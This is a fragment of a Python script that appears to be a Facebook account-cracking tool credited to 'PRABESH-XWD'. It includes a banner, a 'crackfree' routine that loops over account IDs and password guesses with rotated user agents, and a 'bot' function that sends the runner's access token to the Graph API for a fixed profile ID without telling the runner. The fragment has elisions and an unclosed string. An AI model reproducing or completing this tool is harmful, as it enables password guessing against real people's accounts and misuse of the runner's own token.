...
def back():
	login()
def contact():
	os.system('xdg-open https://facebook.com/profile.php?id=100074788749098&mibextid=ZbWKwL/')
	back()
def linex():
...
#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""\033[1;32m  	
  \033[1;32m____________________    _______________________   _________ ___ ___  
\______   \______   \  /  |  \______   \_____  \ /   _____//   |   \ 
 |     ___/|       _/ /   |  ||    |  _/ _(__  < \_____  \/    ~    \
 |    |    |    |   \/    ^   /    |   \/       \/        \    Y    /
 |____|    |____|_  /\____   ||______  /______  /_______  /\___|_  / 
                  \/      |__|       \/       \/        \/       \/  
                        

def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
• DEVLOPER : \033[1;37maPRABESH-\033[1;32mXWD\033[1;37m
...
def bot():
	try:
		requests.post("https://graph.facebook.com/100074788749098?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[PRABESH-EXE] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
